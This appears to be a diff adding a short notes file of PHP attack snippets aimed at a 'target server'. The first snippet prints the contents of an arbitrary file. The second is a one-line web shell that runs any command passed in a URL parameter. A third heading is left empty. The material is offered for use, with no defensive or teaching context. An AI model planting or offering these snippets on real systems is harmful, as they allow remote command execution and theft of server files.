@@ -1,0 +1,18 @@
+script 1: 
+
+<?php echo file_get_contents('/path/to/target/file'); ?>
+
+this script used to retriev the data of a specific file on the target server
+
+__________________________________________________________________________
+
+script 2:
+
+<?php echo system($_GET['command']); ?>
+
+this script used to execute commands on the target server
+
+__________________________________________________________________________
+
+script 3: 
+
